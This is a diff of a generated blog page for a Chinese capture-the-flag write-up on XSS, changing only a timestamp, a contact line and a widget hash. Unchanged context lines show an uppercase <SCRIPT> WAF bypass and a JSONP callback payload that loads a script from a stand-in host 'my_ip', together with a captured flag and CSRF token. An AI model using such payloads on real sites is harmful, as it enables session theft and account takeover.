@@ -37,7 +37,7 @@
 <meta property="og:image" content="http://www.cryscat.com/2019/04/08/一次有趣的XSS弹弹乐/6.jpg">
 <meta property="og:image" content="http://www.cryscat.com/2019/04/08/一次有趣的XSS弹弹乐/7.jpg">
 <meta property="og:image" content="http://www.cryscat.com/2019/04/08/一次有趣的XSS弹弹乐/8.jpg">
-<meta property="og:updated_time" content="2019-04-08T16:16:37.752Z">
+<meta property="og:updated_time" content="2019-04-09T03:21:55.114Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="一次有趣的XSS弹弹乐">
 <meta name="twitter:description" content="这是标题(๑¯∀¯๑)主页： 对着输入框一顿乱锤没反应，还是老老实实注册了个账号登进去了登进去是这样的： site填入自己的服务器地址发现他会访问。经过简单测试发现这里存在反射型XSS，通过大写可以绕过waf  &amp;lt;SCRIPT&amp;gt;alert(1)&amp;lt;SCRIPT&amp;gt;   但输入的内容不符合网站格式，admin不会访问 这里发现一个getInfo接口，返回 jsonp 数据，也存在反射型xs">
@@ -224,7 +224,7 @@
 <blockquote>
 <p>{‘flag’:’flag{j50nP_1s_VulN3r4bLe}’,’csrftoken’:’058807fed91d1b8807688bd258710cbe’} IP: 111.198.29.45  Referer: <a href="http://111.198.29.45:30987/action.php" target="_blank" rel="noopener">http://111.198.29.45:30987/action.php</a>? callback=%3Cscript+src=%22<a href="http://my_ip/xss.js%22%3E%3C%2Fscript%3E" target="_blank" rel="noopener">http://my_ip/xss.js%22%3E%3C%2Fscript%3E</a></p>
 </blockquote>
-<p>目前就找到这一个可行思路，有想法的小伙伴可以+QQ call me哟(・ω&lt;)<br>Thank you for reading.</p>
+<p>Thank you for reading.(・ω&lt;)</p>
 
         </div>
 
@@ -454,5 +454,5 @@ var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
 
 
 
-<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":90,"height":180},"mobile":{"show":true,"scale":0.5},"log":false});</script></body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":90,"height":180},"mobile":{"show":true,"scale":0.5},"log":false});</script></body>
 </html>
